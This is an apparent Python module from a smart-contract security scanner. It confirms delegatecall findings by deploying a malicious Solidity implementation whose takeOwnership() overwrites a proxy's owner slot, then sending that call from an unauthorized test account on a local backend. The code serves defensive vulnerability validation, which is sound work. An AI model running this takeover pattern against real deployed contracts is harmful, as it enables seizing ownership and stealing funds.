"""
Runtime validation scenario for delegatecall findings.

Strategy
~~~~~~~~
For each delegatecall finding, we:

1. Identify the proxy/victim contract and the delegatecall function.
2. Generate a malicious implementation contract that overwrites the
   proxy's ``owner`` storage slot (slot 0) via delegatecall context.
3. Compile both proxy source and malicious implementation together.
4. Deploy the proxy, deploy the malicious implementation.
5. Call the delegatecall function from an unauthorized account,
   passing the malicious implementation address + takeOwnership() calldata.
6. Read ``owner()`` before and after to see if it changed.

Honest classification
~~~~~~~~~~~~~~~~~~~~~
- **confirmed_by_runtime**: The attacker called the delegatecall function
  from an unauthorized account and the proxy's owner was changed,
  proving unrestricted delegatecall with storage corruption.
- **not_confirmed_by_runtime**: The delegatecall transaction reverted
  (e.g., due to access control) — the unsafe path is not reachable
  from an unauthorized caller in the tested scenario.
- **inconclusive_runtime**: The transaction succeeded but the owner
  didn't change — evidence is ambiguous.
- **simulation_unsupported**: The finding's contract shape doesn't
  match what this scenario can deploy/test (e.g., no ``owner`` slot,
  non-standard constructor, etc.).
"""

from typing import Any, List, Optional

from simulation.compiler import CompiledContract, CompilationError, compile_source
from simulation.models import (
    RUNTIME_CONFIRMED,
    RUNTIME_FAILED,
    RUNTIME_INCONCLUSIVE,
    RUNTIME_NOT_CONFIRMED,
    RUNTIME_UNSUPPORTED,
    RuntimeActionResult,
    ValidationRecord,
)


# ── Constants ────────────────────────────────────────────────────────────────

DELEGATECALL_CHECK = "delegatecall-untrusted-target"

# ── Malicious implementation template ────────────────────────────────────────
# This contract is designed to overwrite storage slot 0 (typically the owner
# variable in simple proxy patterns) when called via delegatecall.

_MALICIOUS_IMPL_TEMPLATE = """
// Auto-generated malicious implementation for Aegis delegatecall runtime validation.

contract AegisMaliciousImpl {
    // Storage slot 0: matches the proxy's owner slot in simple proxy patterns.
    address public owner;

    // When called via delegatecall, this writes msg.sender into slot 0
    // of the CALLING contract (the proxy), changing its owner.
    function takeOwnership() external {
        owner = msg.sender;
    }
}
"""


# ── Public API ───────────────────────────────────────────────────────────────

def validate_delegatecall(
    findings: list,
    compiled_contracts: List[CompiledContract],
    backend: Any,
    source_code: str,
) -> List[ValidationRecord]:
    """Validate delegatecall findings by deploying malicious implementations.

    Parameters
    ----------
    findings:
        Full findings list from the scanner.
    compiled_contracts:
        Pre-compiled contracts from the source.
    backend:
        Running HardhatBackend instance.
    source_code:
        Raw Solidity source (needed to compile malicious impl alongside).

    Returns
    -------
    list[ValidationRecord]
        One record per delegatecall finding that was testable.
    """
    validations: List[ValidationRecord] = []
    relevant = [f for f in findings if f.get("check") == DELEGATECALL_CHECK]
    accounts = backend.get_accounts()

    if not relevant:
        return validations

    for finding in relevant:
        record = _validate_one(finding, compiled_contracts, backend, source_code, accounts)
        validations.append(record)

    return validations


# ── Internal logic ───────────────────────────────────────────────────────────

def _validate_one(
    finding: dict,
    compiled_contracts: List[CompiledContract],
    backend: Any,
    source_code: str,
    accounts: list,
) -> ValidationRecord:
    """Attempt delegatecall runtime validation for a single finding."""
    function_name = finding.get("function")
    contract_name = finding.get("contract_name")

    if not function_name:
        return _unsupported_record(
            finding,
            backend,
            contract_name=contract_name,
            error="Function name could not be determined from the static finding.",
        )

    # Find the proxy contract in compiled output.
    proxy_compiled = _find_proxy_contract(compiled_contracts, contract_name, function_name)
    if proxy_compiled is None:
        return _unsupported_record(
            finding,
            backend,
            contract_name=contract_name,
            function_name=function_name,
            error="No deployable proxy contract with a matching delegatecall function was found.",
        )

    # Check that the proxy has an owner() view for storage-change detection.
    if not _has_function(proxy_compiled.abi, "owner"):
        return _unsupported_record(
            finding,
            backend,
            contract_name=proxy_compiled.contract_name,
            function_name=function_name,
            error="Proxy contract does not have an owner() function for storage-change detection.",
        )

    # Determine the correct function signature for the delegatecall.
    dc_func = _get_delegatecall_function(proxy_compiled.abi, function_name)
    if dc_func is None:
        return _unsupported_record(
            finding,
            backend,
            contract_name=proxy_compiled.contract_name,
            function_name=function_name,
            error=f"Function '{function_name}' not found in the compiled proxy ABI.",
        )

    # ── Compile malicious implementation alongside the victim ────────────
    combined_source = source_code + "\n" + _MALICIOUS_IMPL_TEMPLATE
    try:
        combined_compiled = compile_source(combined_source)
    except CompilationError as exc:
        return _failed_record(
            finding,
            backend,
            contract_name=proxy_compiled.contract_name,
            function_name=function_name,
            error=f"Failed to compile malicious implementation: {exc}",
        )

    # Find both contracts in the combined output.
    combo_proxy = _find_by_name(combined_compiled, proxy_compiled.contract_name)
    combo_impl = _find_by_name(combined_compiled, "AegisMaliciousImpl")

    if combo_proxy is None or combo_impl is None:
        return _failed_record(
            finding,
            backend,
            contract_name=proxy_compiled.contract_name,
            function_name=function_name,
            error="Combined compilation did not produce both proxy and malicious implementation contracts.",
        )

    # ── Deploy proxy ─────────────────────────────────────────────────────
    deployer = accounts[0]
    attacker = accounts[1] if len(accounts) > 1 else accounts[0]

    constructor_args = _build_constructor_args(combo_proxy, accounts)

    try:
        proxy_deploy = backend.deploy_contract(
            combo_proxy.abi, combo_proxy.bytecode, constructor_args,
        )
        proxy_address = proxy_deploy["contract_address"]
    except Exception as exc:
        return _failed_record(
            finding,
            backend,
            contract_name=proxy_compiled.contract_name,
            function_name=function_name,
            error=f"Failed to deploy proxy contract: {exc}",
        )

    # ── Read owner before attack ─────────────────────────────────────────
    try:
        owner_before = backend.call_function(
            combo_proxy.abi, proxy_address, "owner",
        )
    except Exception as exc:
        return _failed_record(
            finding,
            backend,
            contract_name=proxy_compiled.contract_name,
            function_name=function_name,
            error=f"Failed to read owner() before attack: {exc}",
        )

    # ── Deploy malicious implementation ──────────────────────────────────
    try:
        impl_deploy = backend.deploy_contract(combo_impl.abi, combo_impl.bytecode)
        impl_address = impl_deploy["contract_address"]
    except Exception as exc:
        return _failed_record(
            finding,
            backend,
            contract_name=proxy_compiled.contract_name,
            function_name=function_name,
            error=f"Failed to deploy malicious implementation: {exc}",
        )

    # ── Build calldata for takeOwnership() ───────────────────────────────
    # takeOwnership() has no arguments, so calldata is just the 4-byte
    # function selector: keccak256("takeOwnership()")[:4].
    try:
        from web3 import Web3
        selector = Web3.keccak(text="takeOwnership()")[:4]
        take_ownership_data = selector
    except Exception as exc:
        return _failed_record(
            finding,
            backend,
            contract_name=proxy_compiled.contract_name,
            function_name=function_name,
            error=f"Failed to encode takeOwnership() calldata: {exc}",
        )

    # ── Execute the attack ───────────────────────────────────────────────
    # Call the delegatecall function from the attacker account, passing
    # the malicious implementation address and takeOwnership() calldata.
    attack_args = _build_attack_args(dc_func, impl_address, take_ownership_data)

    attack_result = backend.execute_transaction(
        combo_proxy.abi,
        proxy_address,
        function_name,
        attack_args,
        attacker,
    )

    actions = [
        RuntimeActionResult(
            status=RUNTIME_CONFIRMED if attack_result.get("success") else RUNTIME_NOT_CONFIRMED,
            action="delegatecall_attack",
            tx_hash=attack_result.get("tx_hash"),
            reverted=attack_result.get("reverted"),
            error=attack_result.get("error"),
            account=attacker,
            function=function_name,
        ),
    ]

    # ── Read owner after attack ──────────────────────────────────────────
    owner_after = None
    try:
        owner_after = backend.call_function(
            combo_proxy.abi, proxy_address, "owner",
        )
    except Exception:
        pass  # Will be classified based on revert status

    # ── Classify result ──────────────────────────────────────────────────
    evidence = {
        "proxy_contract": proxy_compiled.contract_name,
        "proxy_address": proxy_address,
        "malicious_impl_contract": "AegisMaliciousImpl",
        "malicious_impl_address": impl_address,
        "attacker_account": attacker,
        "deployer_account": deployer,
        "function_tested": function_name,
        "attack_function": "takeOwnership",
        "owner_before": owner_before,
        "owner_after": owner_after,
        "attack_tx_hash": attack_result.get("tx_hash"),
        "attack_reverted": attack_result.get("reverted"),
    }

    if attack_result.get("reverted") or not attack_result.get("success"):
        # Attack was blocked — delegatecall path is protected.
        evidence["classification_reason"] = (
            "The delegatecall attack transaction reverted. The proxy contract's "
            "access controls (e.g., onlyOwner modifier) prevented the attacker "
            "from executing the delegatecall path."
        )
        if attack_result.get("error"):
            evidence["revert_reason"] = attack_result["error"]
        status = RUNTIME_NOT_CONFIRMED
    elif owner_after is not None and owner_after != owner_before:
        # Owner was changed — storage corruption confirmed.
        evidence["classification_reason"] = (
            f"The proxy's owner changed from {owner_before} to {owner_after} "
            f"after the delegatecall attack. An unauthorized caller executed "
            f"malicious code via delegatecall, overwriting the proxy's storage."
        )
        status = RUNTIME_CONFIRMED
    elif owner_after is not None and owner_after == owner_before:
        # Transaction succeeded but owner didn't change — ambiguous.
        evidence["classification_reason"] = (
            "The delegatecall transaction succeeded but the proxy's owner "
            "did not change. The evidence is inconclusive — the delegatecall "
            "may have executed but not affected the expected storage slot."
        )
        status = RUNTIME_INCONCLUSIVE
    else:
        # We couldn't read owner after — inconclusive.
        evidence["classification_reason"] = (
            "Could not read the proxy's owner after the attack. "
            "The evidence is inconclusive."
        )
        status = RUNTIME_INCONCLUSIVE

    return ValidationRecord(
        finding_id=finding.get("id"),
        check=DELEGATECALL_CHECK,
        title=finding.get("vulnerability", "Delegatecall"),
        status=status,
        backend=backend.backend_id,
        scenario="delegatecall.storage_takeover",
        contract_name=proxy_compiled.contract_name,
        function_name=function_name,
        evidence=evidence,
        actions=actions,
        limitations=[
            "This scenario tests owner-slot overwrite via delegatecall only.",
            "Contracts without a public owner() getter cannot be tested.",
            "The attacker contract targets storage slot 0 (simple proxy pattern).",
            "Complex proxy patterns with non-standard storage layouts may not be detected.",
        ],
    )


# ── Helpers ──────────────────────────────────────────────────────────────────

def _find_proxy_contract(
    compiled_contracts: List[CompiledContract],
    contract_name: Optional[str],
    function_name: str,
) -> Optional[CompiledContract]:
    """Find the proxy contract containing the delegatecall function."""
    # Try exact match by contract_name first.
    if contract_name:
        for c in compiled_contracts:
            if c.contract_name == contract_name:
                return c

    # Fallback: match by function name presence.
    for c in compiled_contracts:
        if _has_function(c.abi, function_name):
            return c

    return None


def _find_by_name(
    contracts: List[CompiledContract], name: str,
) -> Optional[CompiledContract]:
    """Find a contract in a compiled list by its name."""
    for c in contracts:
        if c.contract_name == name:
            return c
    return None


def _has_function(abi: list, function_name: str) -> bool:
    """Check if the ABI contains a function with the given name."""
    return any(
        item.get("type") == "function" and item.get("name") == function_name
        for item in abi
    )


def _get_delegatecall_function(abi: list, function_name: str) -> Optional[dict]:
    """Get the ABI entry for the delegatecall function."""
    for item in abi:
        if item.get("type") == "function" and item.get("name") == function_name:
            return item
    return None


def _build_attack_args(func_abi: dict, impl_address: str, calldata: bytes) -> list:
    """Build arguments for the delegatecall function.

    Examines the function's input parameters to determine the correct
    argument shape. Supports two common patterns:

    1. (address target, bytes data) — pass impl_address and calldata
    2. (bytes data) — pass calldata only (target from storage)
    """
    inputs = func_abi.get("inputs", [])
    args = []
    for inp in inputs:
        if inp["type"] == "address":
            args.append(impl_address)
        elif inp["type"] == "bytes":
            args.append(calldata)
    return args


def _build_constructor_args(contract: CompiledContract, accounts: list) -> list:
    """Infer constructor arguments from the ABI."""
    for item in contract.abi:
        if item.get("type") == "constructor":
            inputs = item.get("inputs", [])
            if not inputs:
                return []
            args = []
            for inp in inputs:
                if inp["type"] == "address":
                    # Use the deployer account as a safe default address.
                    args.append(accounts[0])
                elif inp["type"].startswith("uint"):
                    args.append(0)
                elif inp["type"] == "bool":
                    args.append(False)
                elif inp["type"] == "bytes":
                    args.append(b"")
                elif inp["type"] == "string":
                    args.append("")
                else:
                    args.append(accounts[0])
            return args
    return []


def _unsupported_record(
    finding: dict,
    backend: Any,
    *,
    contract_name: Optional[str] = None,
    function_name: Optional[str] = None,
    error: str = "",
) -> ValidationRecord:
    return ValidationRecord(
        finding_id=finding.get("id"),
        check=DELEGATECALL_CHECK,
        title=finding.get("vulnerability", "Delegatecall"),
        status=RUNTIME_UNSUPPORTED,
        backend=backend.backend_id,
        scenario="delegatecall.storage_takeover",
        contract_name=contract_name,
        function_name=function_name,
        error=error,
        limitations=["The contract shape is not supported by this runtime scenario."],
    )


def _failed_record(
    finding: dict,
    backend: Any,
    *,
    contract_name: Optional[str] = None,
    function_name: Optional[str] = None,
    error: str = "",
) -> ValidationRecord:
    return ValidationRecord(
        finding_id=finding.get("id"),
        check=DELEGATECALL_CHECK,
        title=finding.get("vulnerability", "Delegatecall"),
        status=RUNTIME_FAILED,
        backend=backend.backend_id,
        scenario="delegatecall.storage_takeover",
        contract_name=contract_name,
        function_name=function_name,
        error=error,
        limitations=["The malicious implementation could not be compiled or deployed."],
    )
